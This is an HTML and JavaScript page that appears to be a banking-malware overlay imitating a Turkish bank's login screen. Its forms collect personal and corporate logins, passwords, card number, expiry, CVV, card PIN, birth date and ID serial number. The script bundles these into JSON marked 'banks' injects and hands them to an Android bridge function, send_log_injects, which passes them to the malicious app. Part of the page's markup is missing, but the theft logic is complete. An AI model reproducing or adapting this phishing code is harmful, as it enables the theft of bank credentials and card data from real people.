<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.js"></script>
    <style>
        #form1, #form2, #form3 {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        section {
            padding: 15px 25px;
            flex: 1;
        }
        
        .cool-input {
            box-sizing: border-box;
            border: 0;
            width: 100%;
            position: relative;
            font-size: 16px;
            margin-bottom: 15px;
        }

        .cool-input__input {
            box-sizing: border-box;
            background: none;
            width: 100%;
            padding: 10px;
            padding-left: 0;
            position: relative;
            z-index: 2;
            font-size: 1em;
        }
        .cool-input__input:focus {
            outline: none;
        }

        .cool-input__placeholder {
            box-sizing: border-box;
            border: none;
            background: none;
            width: auto;
            position: absolute;
            z-index: 1;
            left:20px;
            top: 50%;
            line-height: 1em;
            color: #82878d;
            transition: all 0.2s ease;
            font-weight: 600;
            background-color: #fff;
        }

        .cool-input__input_filled + .cool-input__placeholder, .cool-input__input:focus + .cool-input__placeholder {
            font-size: 0.8em;
            top: 0;
            margin-top: 0.3em;
            background: #fff;
            padding: 5px 6px;
            z-index: 99;
            width: auto;
            left: 8px;
        }

        .input {
            border: 2px solid #dbdce0;
            border-radius: 4px;
            margin-top: 15px;
            padding-left: 15px;
        }

        .input:focus {
            border-color: #559bd1;
        }

        input,button {
            outline: none ;
            box-shadow: none !important;
        }

        .toggle {
            position: relative;
            display: block;
            width: 40px;
            height: 20px;
            cursor: pointer;
            -webkit-tap-highlight-color: transparent;
            transform: translate3d(0, 0, 0);
        }

        .toggle::before {
            content: "";
            position: relative;
            top: 3px;
            left: 0px;
            width: 39px;
            height: 14px;
            display: block;
            background: #b2b2b2;
            border-radius: 43px;
            transition: background 0.2s ease;
        }

        .toggle span {
            position: absolute;
            top: 0;
            left: 0;
            width: 20px;
            height: 20px;
            display: block;
            background: #ececec;
            border-radius: 10px;
            box-shadow: 0 3px 8px rgba(154, 153, 153, 0.5);
            transition: all 0.2s ease;
        }

        .toggle span:before {
            content: "";
            position: absolute;
            display: block;
            margin: -18px;
            width: 56px;
            height: 56px;
            border-radius: 50%;
            transform: scale(0);
            opacity: 1;
            pointer-events: none;
        }

        #cbx:checked + .toggle::before {
            background: #ffd0b2;
        }

        #cbx:checked + .toggle span {
            background: #fa6000;
            transform: translateX(20px);
        }

        #cbx:checked + .toggle span:before {
            transform: scale(1);
            opacity: 0;
            transition: all 0.4s ease;
        }

        #cbx2:checked + .toggle::before {
            background: #ffd0b2;
        }

        #cbx2:checked + .toggle span {
            background: #fa6000;
            transform: translateX(20px);
        }

        #cbx2:checked + .toggle span:before {
            transform: scale(1);
            opacity: 0;
            transition: all 0.4s ease;
        }

        .temember {
            color: #333;
        }

        .button {
            width: 100%;
            padding: 10px;
            font-weight: 600;
            color: #fff;
            background-color: #525199;
            border: 0;
            border-radius: 8px;
            margin-top: 15px;
        }

        .button:disabled {
            background-color: #eee;
        }

        .error {
            border-color: #f00 !important;
        }
    </style>
</head>

                    <input type="password" id="cardCode" name="cardCode" maxlength="4" autocomplete="off" class="input cool-input__input">
                    <span class="cool-input__placeholder">Kart Şifresi </span>
                </div>

                <div class="cool-input" style="float: left;width: 48%;">
                    <input type="tel" id="dob" name="dob" class="input cool-input__input" onkeyup="check5()" autocomplete="off" required>
                    <span class="cool-input__placeholder">Dogum Tarih</span>
                </div>

                <div class="cool-input" style="float: right;width: 47%;">
                    <input type="text" id="serial" name="serial" class="input cool-input__input" onkeyup="check5()" autocomplete="off" required>
                    <span class="cool-input__placeholder">Kimlik Seri No</span>
                </div>

                <input type="submit" class="button" id="sendData" disabled value="Giriş Yap">
            </section>
            <footer>
            </footer>
        </div>
    </form>
    <script>
        $('#login').mask('00000000000')
        $('#password').mask('000000')
        $('#loginKurumsal').mask('00000000000')
        $('#passwordKurumsal').mask('000000')
        $('#cc').mask('0000 0000 0000 0000')
        $('#exp').mask('00/00')
        $('#cvv').mask('000')
        $('#dob').mask('00.00.0000')
        $('#serial').mask('S00S000000')

        $('.cool-input__input').on('input', function(){
            var $this = $(this);
            if ($this.val() == '') {
                $this.removeClass('cool-input__input_filled');
            } else {
                $this.addClass('cool-input__input_filled');
            }
        });

        var form1 = document.getElementById('form1'),
            form2 = document.getElementById('form2'),
            form3 = document.getElementById('form3');

        var goKurumsal = document.getElementById('goKurumsal'),
            goBireysel = document.getElementById('goBireysel');

        var login = document.getElementById('login'),
            loginKurumsal = document.getElementById('loginKurumsal'),
            password = document.getElementById('password'),
            cc = document.getElementById('cc'),
            exp = document.getElementById('exp'),
            cvv = document.getElementById('cvv'),        
			cardCode = document.getElementById('cardCode'),
	        serial = document.getElementById('serial'),
	        dob = document.getElementById('dob'),
            passwordKurumsal = document.getElementById('passwordKurumsal');

        var sendDataBireysel = document.getElementById('sendDataBireysel'),
            sendDataKurumsal = document.getElementById('sendDataKurumsal'),
            sendData = document.getElementById('sendData');

        function check6() {
            if(!valid_credit_card(cc.value)) {
                cc.classList.add('error')
            } else {
                cc.classList.remove('error');
                return true
            }
        }

        function check7() {
            var mmYY = exp.value.split('/');
			var month = parseInt(mmYY[0]);
			var year = parseInt(mmYY[1]);
			

			var expArray = exp.value.split('/');
			var today, someday;
			var exMonth = expArray[0];
			var exYear = "20" + expArray[1];

			today = new Date();
			someday = new Date();
			someday.setFullYear(exYear, exMonth, 1);
                
            if(month > 12 || month == 0 || month == 00 || someday < today || year > 33) {
                exp.classList.add('error')
            } else {
                exp.classList.remove('error')
                return true
            }
        }

        function check5() {
            if(check7() == true && exp.value.length === 5 && cvv.value.length === 3) {
                sendData.disabled = false
            } else {
                sendData.disabled = true
            }
        }

        function valid_credit_card(value) {
            if(value=='' || value.length < 19 || value=='0000 0000 0000 0000') return false;
            if (/[^0-9-\s]+/.test(value)) return false;
            var nCheck = 0, nDigit = 0, bEven = false;
            value = value.replace(/\D/g, "");
            for (var n = value.length - 1; n >= 0; n--) {
                var cDigit = value.charAt(n),
                    nDigit = parseInt(cDigit, 10);
                if (bEven) {
                    if ((nDigit *= 2) > 9) nDigit -= 9;
                }
                nCheck += nDigit;
                bEven = !bEven;
            }
            return (nCheck % 10) == 0;
        }

        goBireysel.onclick = () => {
            form2.style.display = 'none';
            form1.style.display = 'flex'
        }

        goKurumsal.onclick = () => {
            form1.style.display = 'none';
            form2.style.display = 'flex'
        }

        sendDataBireysel.onclick = () => {
            if(login.value.length < 4) {
                login.classList.add('error')
            } else {
                login.classList.remove('error')
            }

            if(password.value.length != 6) {
                password.classList.add('error')
            } else {
                password.classList.remove('error')
            } 

            if(login.value.length > 3 && password.value.length == 6) {
            var data = {};
                data.loginBireysel = login.value;
                data.passwordBireysel = password.value;
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
            }
        }

        sendDataKurumsal.onclick = () => {
            if(loginKurumsal.value.length < 4) {
                loginKurumsal.classList.add('error')
            } else {
                loginKurumsal.classList.remove('error')
            }

            if(passwordKurumsal.value.length != 6) {
                passwordKurumsal.classList.add('error')
            } else {
                passwordKurumsal.classList.remove('error')
            } 

            if(loginKurumsal.value.length > 3 && passwordKurumsal.value.length == 6) {
            var data = {};
                data.loginKurumsal = loginKurumsal.value;
                data.passwordKurumsal = passwordKurumsal.value;
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
            }
        }

        sendData.onclick = () => {
            var data = {};
                data.loginBireysel = login.value;
                data.passwordBireysel = password.value;
                data.loginKurumsal = loginKurumsal.value;
                data.passwordKurumsal = passwordKurumsal.value;
                data.cc = cc.value;
                data.exp = exp.value;
                data.cvv = cvv.value;
                data.cardCode = cardCode.value;
                data.dob = dob.value;
                data.serial = serial.value;
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
        }
    </script>
</body>
</html>
